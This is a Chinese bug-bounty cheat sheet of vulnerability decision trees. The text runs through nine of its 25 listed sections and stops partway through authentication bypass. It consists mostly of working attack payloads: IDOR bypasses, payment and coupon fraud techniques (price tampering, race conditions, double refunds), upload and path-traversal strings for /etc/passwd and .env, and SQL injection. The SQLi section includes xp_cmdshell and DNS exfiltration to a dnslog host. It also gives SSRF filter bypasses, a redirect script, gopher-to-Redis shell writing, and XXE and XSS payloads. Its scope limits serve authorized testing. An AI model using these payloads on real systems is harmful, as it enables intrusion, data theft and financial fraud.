# 漏洞决策树（精简版 — Payload + 数据联动）

> 按需读取：匹配到参数特征后只读对应 §。格式：识别信号 → 决策流程 → Payload
> 共 25 个决策树：§1 IDOR §2 支付 §3 文件上传 §4 SQLi §5 XSS §6 SSRF §7 XXE §8 未授权访问 §9 认证绕过 §10 逻辑缺陷 §11 RCE §12 并发竞争 §13 参数Fuzz §14 SSTI §15 NoSQL §16 Prototype Pollution §17 反序列化 §18 API联动 §19 OSS §20 CORS §21 JSONP §22 OAuth §23 泛查询/筛选绕过 §24 Open Redirect §25 CSRF

## §1 IDOR（越权）
### 识别信号
- 请求含资源 ID：`userId id uid orderId fileId docId accountId`
- **列表类端点**（一请求返回全量数据）：`getuserlist /user/list /getAllUser /api/user/info(无参) /admin/user/list`
- 路径/Query/Body 中出现的归属标识
### 决策流程
```
发现资源ID/列表端点?
├── ⚠️ UI 可见性预检（MANDATORY — 防止把正常业务当漏洞报）:
│   ├── API 返回的字段是否在目标网站页面上已展示?
│   │   例: getAgentList 返回 uid/userName → 打开目标站对应页面
│   │   → /moreAssistant 页面已展示创作者名 → 这些字段是公开业务数据
│   │   → 非信息泄露，标记 "DATA_PUBLIC_IN_UI" → 跳过本§
│   ├── 判断标准: 打开目标网站的对应前端页面
│   │   → 截图对比 API 响应字段 vs UI 展示内容
│   │   → API 有的字段=UI 有的字段 → 正常业务功能
│   │   → API 有的字段≠UI 没有的字段 → 信息泄露（继续本§）
│   └── 常见 UI 公开字段: 用户名/头像/简介/公开ID/创建时间（这些不是漏洞）
│       常见非公开字段: 手机号/邮箱/身份证/密码/Token/内部ID（这些才是漏洞）
│
├── 列表类端点 (getuserlist / getAllUser 等)?
│   ├── 无Cookie/Token直接访问 → 200返回全站用户数据 → 直接【高危/严重】✅
│   │   → SRC proof: 截图返回结构 + 用户数量级，不超5条详情
│   │   → 京东: "越权获取大量用户信息"=高危，"核心DB敏感信息"=严重
│   │   → 讯飞: "核心业务系统敏感越权操作"=高危
│   └── 有低权限Token → 同样返回全量 → 垂直越权【高危】
│
├── 单资源端点 (getUserInfo?userId=X)?
│   ├── 可枚举?(Y→继续 N→从列表收集合法ID)
│   ├── A账号请求自己资源(记录响应)
│   ├── B账号请求A资源ID
│   │   → 返回A数据=IDOR ✅ | 403→进绕过 | 200但空→部分泄露
│   └── 严重度: 单条敏感信息(≤5条proof)→中危, 可批量枚举(≥高危)
│
└── SRC数据限制:
    ├── 京东: 越权读取≤5组真实数据, 严禁批量读取
    ├── 讯飞: 越权读取≤5组真实数据
    └── 仅用自己注册的2个账号验证，勿涉及线上正常用户
```
### 绕过技巧（如果B账号直访问返回403，不走常规ID置换）
```
确定不是IDOR? 不一定——鉴权可能只覆盖了"标准情况"，绕过方式很多:

a) 参数位置变换:
   鉴权只在Query检查userId,但移到Body/Path就放过
   ?userId=1003   → 403
   /api/user/1003  → 200 (Path参数)
   Body:{"userId":1003} → 200

b) 方法替换:
   鉴权只覆盖了GET,但PUT/POST/PATCH/DELETE没覆盖
   GET /api/user/1003  → 403
   POST /api/user/1003 → 200 (换方法)
   PUT /api/user/1003  → 200

c) 大小写/编码绕过:
   参数名/ID值的大小写不一致时鉴权失效
   ?userId=1003 → 403
   ?userid=1003 → 200
   ?USERID=1003 → 200
   ?user_id=1003 → 200

d) 版本降级:
   老版本API没有鉴权,新版有,降级回去绕过
   /api/v2/user/1003 → 403
   /api/v1/user/1003 → 200 (降级)
   /api/user/1003?version=1 → 200

e) Cookie二分法找鉴权参数:
   逐步删除Cookie键值对,找出哪个参数决定当前身份
   Cookie: session=xxx; token=yyy; user_id=zzz
   删session→结果变  |  删token→结果变  |  删user_id→结果变
   → 找到鉴权参数后,替换成他人的值再测

f) 响应包修改绕过前端鉴权:
   如果前端做了校验(401时前端弹窗),但后端实际返回了数据
   在Burp中将响应状态码401改200,或false改true,看前端是否展示他人数据
   本质:后端没鉴权,前端自己做了一层校验,Burp改响应即可绕过

g) 跨类型越权:
    不是同类型账户间越权,而是不同类型间
    如: 团队版账号帮个人版账号支付,管理员账号覆盖普通用户数据
    核心: 在一个请求中同时携带两个身份参数

h) 两步验证中篡改目标ID（多步流程常见）:
    第一步验证自己手机号(短信发给自己)→第二步改目标ID为别人的
    核心: 第二步只校验了"验证码正确",没校验"当前操作人是否对该ID有权限"
    例: 变更店铺负责人→第一步验自己手机→第二步改shopId=别人的店铺ID+新负责人填自己
        → 自己成为别人店铺的负责人

i) 导出/导入越权:
    导出: 导出参数中带shop_id/teamId→改成别人的→导别人全量数据
    导入: 先上传文件拿fileURL→第二步导入时改target_id为别人的
          → 文件内容写入别人空间

j) 筛选/查询接口越权:
    不要只看详情接口——筛选/列表/搜索类接口也常带ownerId/shopId参数
    替换成别人的 → 能查到别人名下的全量数据
    而且这类接口容易被人忽略,鉴权往往更弱

k) 越权改导致所有权转移（编辑变删除）:
    修改别人数据时,如果ID改成了数据属于别人的ID
    修改后的数据归属权可能变成自己的→原始数据从原用户那消失
    核心: 表面是"编辑",实际是"删除别人的数据"

l) Cookie统一认证绕过:
    Cookie里有多个参数时,逐个删除主要的鉴权Token(如bduss/token/session)
    看删除后是否还能正常访问接口
    如果能→说明有另一个参数(如uid)在做鉴权→改uid=别人的值→越权

m) 同源功能点参数推测隐藏接口:
    已知可用接口(如countByCondition)→猜同类接口也存在(如saveByCondition)
    方法: 在JS中搜动词(count→save/delete/update)组合同一路径段
```
### Payload
```
参数名: id uid user_id userId memberId accountId orderId fileId docId
位置: ?userId=1002 | Body:{"userId":1002} | Path:/api/users/1002
测试值: 0 -1 null undefined 其他用户已知ID
列表端点: GET /api/getuserlist (no params) / GET /api/user/info (no params)

注：如果IDOR端点是带筛选条件的查询接口（如 ?ownerId=xxx 限定当前用户），
先测完本§的ID置换 → 再进 §23 泛查询测筛选绕过（置空/删除/置0/%）。
```
### 关联漏洞
- 筛选绕过/泛查询 → §23

## §2 支付逻辑
### 识别信号
- `amount price total fee payAmount discount goodsId skuId typeId couponId qty count`

### 决策流程
```
发现支付类接口?

├── 金额由前端传?
│   └── 改金额为0.01/0.1 → 支付成功=金额篡改漏洞 ✅  ← 最快
│       仅用自己的测试订单,测完取消,标注"安全测试"

├── 金额不能改但选了高价商品?
│   └── goodsId/skuId/typeId替换 → 选599元商品+把goodsId换成19.9元的ID
│       选高价付低价 ✅  ← 常见
│       注意: 有些在"生成支付二维码"环节替换goodsId,不是在最终支付环节

├── 有支付结果回调/返回包处理?
│   ├── 改返回包状态码: 支付失败返回包中 status=fail → 改成 success
│   │   部分系统只校验返回中的状态码,不改业务数据
│   ├── 测试支付通道: 找 type=test / type=0 / type=debug 等非正式支付方式
│   │   开发时留下的测试通道,不走真实扣款
│   └── 支付链接重放: 限时优惠/首单优惠的支付链接保存后重复使用
│       即使活动页面已过期,支付链接可能仍有效

├── 有订单状态变更接口(Order Finish / Complete)?
│   └── 直接调用 /orders/{id}/finish 或 /orders/{id}/complete 的PUT/GET
│       后端可能没校验是否已支付,直接完成订单
│       类似: 改订单状态参数(paid/pending/cancel互相切换)

├── 有充值/提现/转账场景?
│   ├── 提现四舍五入: 提现1.005元 → 实际到账1.01元(平台只精确到分)
│   │   和充值四舍五入同理,但提现方向常被忽略
│   ├── 最低充值绕过: 限制最低充100 → 改amount突破下限
│   └── 提现并发: 积分兑换现金时多发 → 同笔余额提现多次

├── 有订单替换机会?
│   ├── 订单ID替换: 创建A订单(10元)+B订单(100元) → 支付B时替换orderId为A的
│   │   付10元得100元商品
│   └── 成人票改儿童票: 多类型定价场景(type=adult → type=child)
│       成人票价980,儿童票490 → 互换类型参数

├── 有优惠券/代金券字段?
│   ├── 隐藏券遍历: couponId从1开始递增 → 找到未公开的高额优惠券  ← 最快
│   ├── 券越权用: couponId不绑定用户 → A的券B也能用 → 消耗他人券
│   ├── 券超范围使用: 买电器但接口无couponId字段? → 手动加上,填食品券ID
│   ├── 券num叠加: 使用券时找num/count参数 → 改num=2 → 一张当两张用
│   ├── 代金券拆分并发: 50元代金券只剩17.6余额,并发创建2个10.8元的订单
│   │   同时扣款 → 两个订单都0元支付(余额只够1次)
│   ├── 过期券绕过: 修改time参数使用已过期/未到期的优惠券
│   ├── 并发用券: 一张券多线程同时提交 → 全部成功
│   ├── 券重放: 用完的券code再发一次 → 可重复使用
│   ├── 卡支付界面多设备一券多用:
│   │   设备A用券创建订单不支付→设备B取消订单(券退回)→设备A同时支付→一券付两单
│   ├── 凑单退款: 买A+B退A,券不退且B白拿
│   ├── 取消订单并发退券: 取消订单时多发 → 一张券退回多次 → 无线刷券
│   ├── 优惠券+商品ID横向并发: 一张券同时买不同商品 → 换product_id多发
│   └── 首单优惠并发复用: 多发创建订单→所有订单都有首单折扣

├── 有优惠券发放接口?
│   └── 全站发券越权: 调用内部发券接口 → 给自己/指定账号发券
│       (常见于内部管理接口没有鉴权)

├── 有退款场景?
│   ├── 多端并发退款: 同时发微信退款+支付宝退款 → 同笔订单退两次
│   └── 退款后状态未更新 → 可多次退款

├── 有试用/首单/新人优惠?
│   ├── 试用并发刷时长: 激活免费试用的接口多发 → 叠加N天VIP
│   └── 首单签约绕过: 首单优惠的签约接口多发 → 重复享受新人价

├── 有盲盒/抽奖/直播礼物?
│   ├── 盲盒ID篡改: 换boxId/hiddenItemId → 每次抽都是稀有物品
│   └── 礼物ID遍历: 找隐藏/测试礼物(通常价格极低但价值高)

├── 有扫码绑定/设备绑定?
│   └── 扫码绑定无二次确认: 扫了码直接绑定,中间没有用户确认步骤
│       → 扫别人的码绑到自己账号 → 盗取他人权益

├── 有加密/签名参数?
│   └── 在签名前修改: 先找到生成签名的请求阶段(通常是上一步)
│       在那一步修改参数 → 签名重新计算 → 金额篡改

└── 以上都不行?
    └── 状态机绕过: 支付完成后改状态回"未支付"→再退再支付
```
### Payload
```
金额篡改: amount=0.01 total=0.01 price=0.01
商品ID替换: goodsId=19.9元商品的ID
数量异常: qty=0.5  qty=-1  qty=溢出临界值(如998998996172801)
优惠券: couponId=1..100遍历  couponCode=已用过的code
并发: 同一请求多发5-10次
```

---

## §2+ Payment Logic — Edge Cases

> In addition to basic price/amount manipulation (§2), test these advanced variants:

### 识别信号 (same as §2)
- `amount price total fee payAmount cost discount qty count transport_type freight`

### 决策流程 (advanced)
```
Basic price tampering fails?
├── Data overflow: set amount=2147483649 → wraps to 1
│   → INT_MAX (2147483647) + 1 → 1 due to integer overflow
├── Negative freight: transport_type=-186.00 → total becomes near-zero
│   → Positive item price + negative shipping/coupon = minimal total
├── Rounding exploit: set amount=0.019
│   → Third-party payment rounds to 0.01, server records 0.02
├── Order swap: pay cheap order → replace orderId with expensive order
│   → Server checks payment completed, ignores amount mismatch
├── Order splitting: pair expensive item with bulky item for free shipping
│   → Cancel bulky item after payment → keep free shipping on cheap item
├── Dual-payment race: open payment page on 2 devices simultaneously
│   → Device A pays → Device B pays with same discount → double benefit
├── Coupon enumeration: fuzz couponId/endpoint → find hidden/test coupons
│   → Dev/test coupons with 100% discount, expired but still valid
└── Quantity manipulation: qty=0.1 / qty=-1 / qty=0
```

### Payload (advanced)
```
Overflow values: 2147483648  2147483649  -2147483648  9223372036854775808
Rounding: 0.001  0.019  0.099  0.009
Negative: -1  -0.01  -999
Freight params: transport_type  freight  shipping  delivery_fee
Coupon params: couponId  couponCode  promoCode  voucherId  discountCode
```

---

## §3 文件上传 & 文件下载（目录穿越）

### 识别信号
- 上传: Content-Type: multipart/form-data, 路径 /upload /file /import
- 下载: 路径 /download /file/download /files/{filename} /export

### 决策流程
```
发现文件上传接口?
  上传合法文件记录路径+后缀+Content-Type
  → 尝试绕过: .php .php5 .jsp .jspx .asp .aspx (大小写/双后缀/空格/::$DATA)
  → 成功=高危; 拦截→改Content-Type→路径穿越→.htaccess

发现文件下载接口?
  ├── Step1: 先试当前文件名 → 200/404/报错
  │   → 不管返回什么,下一步一定是目录穿越
  │
  ├── Step2: 目录穿越 Fuzzing(强制步骤,不能跳过):
  │   Linux:    ..%2f..%2f..%2fetc%2fpasswd
  │             ../../../../etc/passwd
  │             ..%252f..%252f..%252f..%252fetc%252fpasswd (二次编码)
  │   Windows:  ..%2f..%2f..%2f..%2fWINDOWS%2fwin.ini
  │             ..\..\..\..\Windows\win.ini
  │   Java项目: ..%2f..%2fWEB-INF%2fweb.xml
  │             ..%2f..%2fWEB-INF%2fclasses%2fapplication.yml
  │   Python项目: ..%2f..%2f..%2fapp.py
  │                ..%2f..%2f..%2f.env
  │
  ├── Step3: 如果下载成功 → 高危/严重(任意文件读取)
  │   [SRC] 只读系统文件确认危害,不写文件不修改
  │   [SRC] 读到 /etc/passwd 或 web.xml 即可确认
  │
  └── Step4: 结合下载的文件内容扩大战果
      application.yml → 数据库密码/密钥/云凭证 → 进 §19 OSS
      web.xml → 过滤器链/鉴权配置 → 进 §1 IDOR
      .env → 环境变量/密钥 → 进 cve-chains 密钥利用
```

### Payload
```
PHP: .php .php5 .phtml .pht .phar .shtml
JSP: .jsp .jspx .jspf
ASP: .asp .aspx .ashx .asmx .cer .asa
绕过: .php%00.jpg .php<space> .Php .php::$DATA shell.jpg.php

目录穿越:
  Linux: ../../../../etc/passwd
          ../../../../etc/shadow (只确认存在,不读内容)
          ../../../../proc/self/environ
  Windows: ..\..\..\..\Windows\win.ini
           ..\..\..\..\boot.ini
  Java:   ..%2f..%2f..%2f..%2f..%2fWEB-INF%2fweb.xml
          ..%2f..%2f..%2f..%2fWEB-INF%2fclasses%2fapplication.properties
          注意: nginx 通常解码一次 %2f,部分Java容器会再解码一次
```

## §4 SQL注入

### SRC 合规边界（执行前必读）
```
[SRC ALLOWED] 手工payload测注入存在、报错/布尔/时间三类检测、database()/version()证明可读(1-2行)、
              DNSLog OOB带出库名、CASE WHEN排序侧信道
[SRC FORBIDDEN] SQLmap、dump表数据、into outfile写shell、general_log写shell、xp_cmdshell
```

### 识别信号
- `id page orderBy sort keyword search key`

### 场景判断树（先判定场景，再选Payload）
```
发现疑似SQL注入参数?
├── 有报错回显? (如 MySQL error in response)
│   └── 报错注入 → 用updatexml/extractvalue/floor函数
│       证明: 报错信息中包含database()值 → 注入存在 ✅
│
├── 无报错但页面有正常/异常两种状态?
│   └── 布尔盲注 → 用AND 1=1/1=2差异证明
│       证明: 页面正常 vs 空白/报错 → 注入存在 ✅
│
├── 页面始终相同?
│   └── 时间盲注 → 用SLEEP/WAITFOR/big bencmark证明
│       证明: 响应时间明显差异(如3s vs 0.1s) → 注入存在 ✅
│
└── 任何场景都可用DNSLog OOB → 盲注时快速出数据
    证明: DNSLog收到database()的DNS请求 → 注入存在 ✅
```

### 决策流程

```
[Step 0] 判断数据库类型(决定用哪套Payload):
  报错信息含 MySQL / MariaDB → MySQL
  报错信息含 Microsoft OLE DB / SQL Server → MSSQL
  报错信息含 Oracle / ORA- → Oracle
  报错信息含 PostgreSQL / PG:: → PgSQL
  无报错时通过延时函数反向判断(见下方延时表)

[Step 1] 有报错回显 → 报错注入(最快，首选):
  MySQL:
    updatexml(1, concat(0x7e, (select database()), 0x7e), 1)
    extractvalue(1, concat(0x7e, (select database()), 0x7e))
    floor(rand(0)*2) group by → 主键冲突报错
  MSSQL:
    convert(int, db_name())     → 类型转换报错
    1/@@servername              → 除零报错
  PgSQL:
    cast((select version())::text as integer) → 类型转换报错
  Oracle:
    CTXSYS.DRITHSX.SN(user, (select banner from v$version))
    XMLType(chr(123)||(select banner from v$version)||chr(125))

  证明: 报错信息中看到database()/version()返回值 → 注入存在 ✅

[Step 2] 无报错但有真假状态 → 布尔盲注:
  准备: 先用 length() 猜目标长度
  再用 ascii(substr()) + 二分法逐字符比大小
  函数: length() substr() ascii() / ord() mid()
  Payload:
    ?id=1 AND length(database())>5   → 正常=长度>5
    ?id=1 AND ascii(substr(database(),1,1))>64  → 二分法
  证明: 页面在 True/False 间稳定切换 → 注入存在 ✅

[Step 3] 页面完全无差异 → 时间盲注:
  MySQL:    ?id=1 AND IF(length(database())>5, SLEEP(3), 0)
  MSSQL:   ?id=1; IF (LEN(DB_NAME())>5) WAITFOR DELAY '0:0:3'
  PgSQL:   ?id=1 AND (SELECT CASE WHEN LENGTH(CURRENT_DATABASE())>5 THEN pg_sleep(3) ELSE pg_sleep(0) END)
  Oracle:  ?id=1 AND (SELECT CASE WHEN LENGTH(SYS_GUID())>5 THEN dbms_pipe.send_message('x',3) ELSE 0 END FROM dual)--
  补充(绕过sleep): MySQL benchmark(50000000, md5('x'))  /  笛卡尔积大表关联

  证明: 条件为真时响应延迟3s+ → 注入存在 ✅

[Step 4] 任何场景均可 → DNSLog OOB快速确认(盲注加速):
  MySQL:    ?id=1 AND LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.xxxx.dnslog.cn\\a'))
  MSSQL:   ?id=1; DECLARE @s VARCHAR(1024);SET @s='ping '+DB_NAME()+'.xxxx.dnslog.cn';EXEC master..xp_cmdshell @s;
  Oracle:  ?id=1 AND UTL_HTTP.REQUEST('http://'||(SELECT SYS_GUID() FROM dual)||'.xxxx.dnslog.cn/a')=1

  证明: DNSLog 收到含 database() 值的 DNS 请求 → 注入存在 ✅
  [SRC NOTE] 仅带出 database()/version()，不读表数据

[Step 5] ORDER BY / sort 参数的特殊注入(排序语句场景):
  ?sort=id                  → 正常
  ?sort=(CASE WHEN 1=1 THEN id ELSE views END)  → 正常(1=1为真)
  ?sort=(CASE WHEN 1=2 THEN id ELSE views END)  → 排序变化(1=2为假)
  ?sort=(SELECT CASE WHEN SUBSTR(database(),1,1)='t' THEN id ELSE views END)
  证明: 改变排序顺序 → 注入存在 ✅
  补充: ?order=CASE%20WHEN%201=1%20THEN%201%20ELSE%201/(SELECT%200)%20END
       → 异常/除零报错 → 证明注入存在
```

### 场景优先级速记
```
有报错 → 报错注入(最快)  ← 首选
无报错有真假 → 布尔盲注(中等)
完全无差异 → 时间盲注(最慢)  ← 兜底
任何场景 → DNSLog OOB(盲注加速)  ← 推荐
排序参数 → CASE WHEN 排序侧信道  ← 特殊场景
```

### Payload
```
数字:   ?id=3/3  ?id=3-1  ?id=3 AND 1=1
字符:   ?id=1'   ?id=1"   ?id=1')
延时:
  MySQL:  SLEEP(5)  /  BENCHMARK(50000000,MD5('x'))
  MSSQL:  WAITFOR DELAY '0:0:5'
  PgSQL:  pg_sleep(5)
  Oracle: dbms_pipe.send_message('x',5)  /  UTL_INADDR.get_host_name('10.0.0.1')

[SRC] 以上所有Payload均为无害化检测手段
[SRC] 仅证明注入存在/出库名即停止，禁止爆表/dump
```

## §5 XSS
### 识别信号
- 用户输入回显到页面（评论/搜索/资料/URL参数）
### 决策流程
```
输入<>'"识别上下文 → HTML标签间/属性中/JS代码中/URL中
反射型=请求即执行 存储型=持久执行  DOM型=JS从URL取值写入
```
### Payload
```
<script>console.log('xss')</script>
<img src=x onerror=console.log('xss')>
<svg onload=console.log('xss')>
" onmouseover=console.log('xss') "   ' onclick=console.log('xss') '
';console.log('xss')//    javascript:console.log('xss')
```

## §6 SSRF

### SRC 合规边界（执行前必读）
```
[SRC ALLOWED] DNS/collaborator OOB回调确认SSRF存在、file://读/etc/passwd(自己账号)、
              cloud metadata(scope内时)、HTTP内网探测(SRC提供靶场时)
[SRC FORBIDDEN] 写webshell/cron/SSH key、内网扫描(无靶场时)、Redis命令执行、
                FastCGI RCE、MySQL协议攻击
```

### 识别信号
- `url callback redirect webhook image_url target`

### 场景判断树（先判定场景，再选手法）
```
发现参数疑似SSRF?
├── 目标有OOB能力? (能访问外网)
│   └── 替换参数为collaborator URL → 有DNS回调=SSRF存在 ✅
│
├── 目标不出网? (完全无法OOB)
│   ├── 尝试 file:///etc/passwd 读本地文件 → 有内容=SSRF存在 ✅
│   └── 尝试 http://127.0.0.1:80 → 返回页面内容=SSRF存在 ✅
│
├── 有白名单/协议限制? → 见下方"绕过方式"
│
└── 被WAF拦截? → 先换协议(http↔https)再换编码 → 还不行→LAST RESORT bypass
```

### 决策流程
```
Step 0 — OOB检测(首选，最快确认SSRF存在):
  替换参数为: http://{collaborator-url}/ssrf
  → collaborator收到HTTP/DNS请求 → SSRF存在 ✅
  [SRC] OOB回调=SSRF确认证据，不需要进一步利用

Step 1 — 确认后可选的危害证明(只读不写):
  file:///etc/passwd          → 读系统文件(证明能访问内网文件)
  file:///c:/windows/win.ini  → Windows系统文件
  http://127.0.0.1:80         → 本地Web服务(看有没有敏感信息)
  http://[::1]:80             → IPv6本地回环
  [SRC] 以上均只读，不写文件、不写shell、不改配置

Step 2 — 白名单绕过方式(纯检测思路，不用于利用):
  
  a) DNS Rebinding 绕过(TOCTOU利用):
     原理: 域名配置极短TTL(0s)→第一次解析返回正常IP(过白名单检查)
          →第二次解析(实际请求)返回内网IP(127.0.0.1)
     检测: 准备一个TTL=0的域名 → 先HEAD请求过白名单 → GET时域名解析到内网
     [SRC] 只通过OOB回调验证绕过了白名单，不实际内网探测

  b) 302 Redirect 绕过(HTTP协议层):
     原理: 攻击者VPS上部署脚本→HEAD请求返回200(过预检)→GET请求返回302跳转到内网
     →后端HTTP库默认跟随重定向→未对跳转后URL二次校验→SSRF绕过
     PHP实现(检测用，部署在自己VPS):
       if ($_SERVER['REQUEST_METHOD'] === 'HEAD') { header("HTTP/1.1 200 OK"); echo "ok"; }
       else { header("HTTP/1.1 302 Found"); header("Location: http://127.0.0.1:80"); }
     [SRC] 只证明可绕过白名单/HEAD预检→OOB回调确认，不实际内网利用

  c) HEAD+GET 预检绕过(厂商常见防御):
     场景: 服务器先HEAD请求验货(看Content-Type/Content-Length)→再GET请求
     绕过: 
       - DNS Rebinding(见a) → HEAD时外网IP，GET时内网IP
       - 302 Redirect(见b) → HEAD返回200，GET重定向内网
     [SRC] 证明防御可绕过即可，不实际内网探测

  d) 进制编码/IP简写:
     http://2130706433/             → 127.0.0.1 十进制
     http://0x7f000001/             → 127.0.0.1 十六进制
     http://0x7f.0x0.0x0.0x1/      → 分段十六进制
     http://[::ffff:127.0.0.1]/    → IPv6映射
     http://0/                      → Linux下代表0.0.0.0=本机
     http://127.1/                  → 省略写法
     http://localhost/              → DNS解析
     http://evil.com@127.0.0.1/    → @绕过(部分库忽略@前内容)
     http://127.0.0.1#evil.com/    → #绕过(#后内容被忽略)

Step 3 — 协议选择分层策略:
  探测阶段: http:// (最快确认存活)
  读取阶段: file:// (读文件确认危害)
  验证阶段: collaborator OOB (最通用)
  [SRC] 不需要用到 gopher/dict 协议来证明SSRF存在
  [SRC] gopher/dict 协议涉及内网协议交互 → 除非SRC明确授权，否则禁用
```

### 场景优先级速记
```
OOB回调 → 最快确认SSRF存在  ← 首选
读文件   → file:// 读passwd证明能访问内网  ← 次选
DNS Rebinding / 302 Redirect → 绕过白名单/HEAD预检  ← 绕过场景
进制编码/IP简写 → 绕过IP黑名单  ← 绕过场景
```

### Payload
```
[SRC SAFE] 仅用于确认SSRF存在:
  http://{collaborator-url}/ssrf       → OOB确认
  file:///etc/passwd                    → 读文件确认
  http://127.0.0.1:80                   → 本地确认
  http://[::1]:80                       → IPv6本地
  
[SRC FORBIDDEN — 仅授权渗透测试使用]:
  gopher://127.0.0.1:6379/_*         → Redis交互(写shell/cron/SSH key)
  dict://127.0.0.1:6379/INFO          → 内网端口探测
  file:///etc/shadow                  → 敏感文件读取
  cloud metadata(无scope)             → 云元数据
```

## §7 XXE
### 识别信号
- Content-Type: application/xml, SOAP, XML导入
### 决策流程
```
注入<!DOCTYPE> → 有文件回显=XXE ✅ | 无→带外XXE(外带DNSLOG)
```
### Payload
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>   <!-- Tier1: own test account -->
<root>&xxe;</root>
```
### 带外
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://xxxx.dnslog.cn">]>
```

## §8 未授权访问
### 识别信号
- 管理路径 /admin /manage /actuator /swagger /druid
- **数据列表接口（高价值）**: /getuserlist /getAllUser /user/list /api/user/info(无参) /order/list /export
### 决策流程
```
无Cookie/Token请求:
├── 列表类端点 (getuserlist / getAllUser)?
│   ├── 200返回多用户数据 → 未授权访问【高危/严重】✅
│   │   → 一请求返回多条不同用户记录=确认未授权
│   └── 200但仅返回[]空数组 → 需认证
│
├── 单条端点 (getUserInfo?userId=X)?
│   ├── 无参数时返回数据? → 需确认归属:
│   │   ├── 对比：有Token vs 无Token 返回的是否同一用户?
│   │   │   → 同一用户=返回自己的数据(基于session/cookie) → 不是IDOR
│   │   │   → 不同用户=未授权访问 ✅
│   │   └── 无法确认时：用2个不同session(不同浏览器/无痕窗口)分别无Token访问
│   │       → 返回相同数据=可能是公开数据 → 非漏洞
│   │       → 返回不同用户数据=未授权 ✅
│   └── 有参数时 → 进入§1 IDOR决策流程
│
└── 高价值未授权端点（直接高危/严重）:
    GET /api/getuserlist → 返回全站用户数据(手机/邮箱/身份证) → 严重
    GET /api/getAllUser → 同上 → 高危起步
    GET /api/order/list → 返回全站订单 → 严重
    POST /api/admin/export → 导出全量数据 → 严重

判断逻辑:
  一请求返回多条不同用户=未授权访问确认 → 高危/严重
  一请求返回单条=需确认归属 → 可能是自己的数据 → 需对比验证
  无法确认归属=不构成漏洞 → "无法确认"

SRC数据限制: 
  ≤5条真实数据证明即可, 截图返回结构+数据量级
  京东: 越权读取≤5组, 讯飞: 越权读取≤5组

```

### 接口发现技巧（未授权检测之前，先找到目标有哪些接口）


发现目标有哪些接口可测未授权?

```
├── 方式1: 权限菜单分析法（最高效——一次找到全部功能接口）
│   ├── 登录后刷新页面,找到返回"权限菜单"的接口(通常在最早几个包中)
│   │   关键词: getMenu, getResource, getPermission, getUserInfo, getRouters
│   │
│   ├── 根据响应格式分五类处理:
│   │   类型A(全开放): 返回所有菜单但isShow=0/1 → isShow改1即可前端显示
│   │   类型B(半开放): 只返回当前用户拥有的菜单 → JS中搜menu/menus找未列出的
│   │   类型C(零开放): 响应为空 → 见下方4种破解法
│   │   类型D(特殊JSON): 复杂格式 → 分析json结构找到权限控制字段
│   │   类型E(单参数): 一个参数决定全部(isAdmin=false→true,level=0→1)
│   │
│   └── 零开放(类型C)的4种破解:
│       1. JS搜关键字: menu, menus, view, views, models, resource
│       2. JS搜接口名: 把菜单接口名拿去JS搜→找到if判断中引用的其他菜单
│       3. 历史包泄露: 其他接口响应中可能泄露完整权限菜单列表
│       4. 角色管理接口: 给新用户分配权限的接口通常会把所有权限列出来
│
├── 方式2: 路由 vs 接口区分（避免把时间浪费在路由上）
│   ├── 从JS提取的路径中,返回固定大小HTML(如2.7KB)的是路由→跳过
│   ├── 返回JSON数据的才是接口→只测这些
│   └── 快速区分: 在BP中批量跑路径→看响应大小是否都是一致→一致则都是路由
│
├── 方式3: Incomplete Path也要测
│   ├── FindSomething的Incomplete Path分类(不以/开头的相对路径)
│   └── 同样可能是有效接口,拼接到baseURL后面测
│
├── 方式4: 特殊请求头导致浏览器直连失败→必须在Repeater测
│   ├── 浏览器URL栏直接访问→404(因为没有自定义请求头)
│   ├── 但BP Repeater中带正确请求头(如Referer/Origin/Cookie)→200
│   └── 不要在浏览器中直接拼接URL测未授权,要发到Repeater
│
└── 方式5: 不登录的未授权(零权到有权)
    ├── 不带Cookie访问→后端读不到用户身份→可能直接跳过鉴权逻辑
    └── 同一接口在登录和未登录状态都测一遍
```

### 关联漏洞
- 若返回数据有用户身份限定参数(ownerId/categoryId等) → §23 泛查询/筛选绕过


## §9 认证绕过

### 场景判断树（按登录流程分阶段测）
```
发现登录/注册/找回密码/重置接口?

├── 验证码环节 (验证码=第一道大门)
│   ├── 验证码回显? → 注册/登录接口返回验证码明文
│   ├── 验证码永不失效? → 同一个验证码5分钟后还能用
│   ├── 验证码未绑定手机号? → A手机收到的验证码,B手机也能用
│   ├── 验证码参数可删? → 不传code/captcha字段 → 绕过验证
│   ├── 验证码分步可跳过? → 第一步验证码→第二步直接改URL跳到第三步
│   ├── 图片验证码OCR? → 4位数字可被自动识别
│   ├── 图片验证码参数无校验? → height=200/width=400(传实际宽度的2倍)
│   │   确认参数未被校验即可,不传超大数字导致服务器崩溃
│   └── 双手机号逗号注入? → phone=138xxxx,139xxxx → 两个号码收同一个验证码
│
├── 短信验证码环节
│   ├── 频控绕过? → 同一手机号无限发(短信轰炸)
│   ├── 短验证码可爆破? → 4位数字验证码,0000-9999遍历
│   ├── code参数可空/固定? → 不传code或传0000/123456
│   └── 验证码写入模板? → 验证码直接写在短信模板内容里(如"您的验证码是{code}")
│
├── 第三方登录环节 (OAuth/QQ/微信/GitHub)
│   ├── UID替换? → 登录时将OAuth响应中的用户ID替换成他人的
│   ├── OpenID可遍历? → OpenID是递增数字 → 遍历登录他人账号
│   └── 第三方登录绑定未校验? → A账号绑定B的微信 → 盗取B的登录权限
│
├── 密码重置/找回密码环节
│   ├── email参数替换? → 重置链接中email=你@xxx.com改成email=他人@xxx.com
│   ├── token未绑定? → A收到的重置token,B也能用来重置A的密码
│   ├── 跳步? → 直接跳到"设置新密码"那步,跳过旧密码验证
│   └── 响应包泄露? → 重置链接/token直接写在响应体里
│
├── Session/凭证环节
│   ├── Session混淆? → 前端和API共享同一个Session → 改一个影响另一个
│   ├── MVC自动绑定? → Spring自动绑定userId/role等参数 → 加请求参数覆盖身份
│   └── 凭证直发? → 注册/登录无需验证直接返回Token
│
└── 用户名枚举环节 (辅助信息收集)
    ├── "账号不存在" vs "密码错误" → 枚举有效账号
    ├── 响应时间差异 → 有效账号处理时间长 → 时序侧信道
    └── 验证码发送前校验用户存在? → 发验证码接口响应差异
```

### 决策流程
```
发现任何登录/注册/重置接口:
  Step1: 先看验证码 → 回显/永不失效/可删/未绑定  ← 最快发现
  Step2: 再看第三方登录 → UID替换/OpenID遍历  ← 高危
